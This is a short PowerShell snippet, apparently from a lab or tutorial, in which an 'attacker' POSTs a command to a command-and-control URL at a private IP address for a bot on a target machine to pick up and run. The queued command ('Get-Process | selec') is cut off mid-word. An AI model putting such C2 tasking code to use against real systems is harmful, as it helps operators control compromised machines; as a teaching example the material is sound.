# The attacker: POSTing a command to the C&C.  The bot running on the target machine will read this.
$CCC_URL = "http://10.11.8.38/cncPost"

$command = "Get-Process | selec"

$postParams = @{command=$command}
Invoke-WebRequest -Uri $CCC_URL -Method POST -Body $postParams
